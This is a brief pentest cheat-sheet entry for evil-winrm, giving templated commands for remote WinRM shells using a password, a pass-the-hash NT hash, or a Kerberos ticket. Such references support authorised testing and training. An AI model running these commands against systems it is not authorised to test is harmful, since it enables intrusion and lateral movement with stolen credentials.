# Evilwinrm

## evil-winrm

### password

WinRM shell on the target with cleartext password auth. Default port 5985 (HTTP), use `-S` for 5986 (HTTPS).

```sh title:"WinRM shell authenticated with password"
evil-winrm -i $rhost_ip -u $user -p $pass
```
<!-- cheat
import users
import passwords
var rhost_ip
-->

### ntlm hash

WinRM shell using pass-the-hash with the user's NT hash. Drop the `:` prefix; evil-winrm wants the bare 32 hex chars.

```sh title:"WinRM pass-the-hash shell with NT hash"
evil-winrm -i $rhost_ip -u $user -H $hash
```
<!-- cheat
import users
import passwords
var rhost_ip
var hash
-->

### kerberos

WinRM shell using a Kerberos ticket. Requires a valid ccache (`KRB5CCNAME`) and `/etc/krb5.conf` pointed at the realm KDC.

```sh title:"WinRM shell authenticated with Kerberos ticket"
evil-winrm -i $rhost_ip -u $user -r $realm
```
<!-- cheat
import users
import passwords
var rhost_ip
var realm
-->

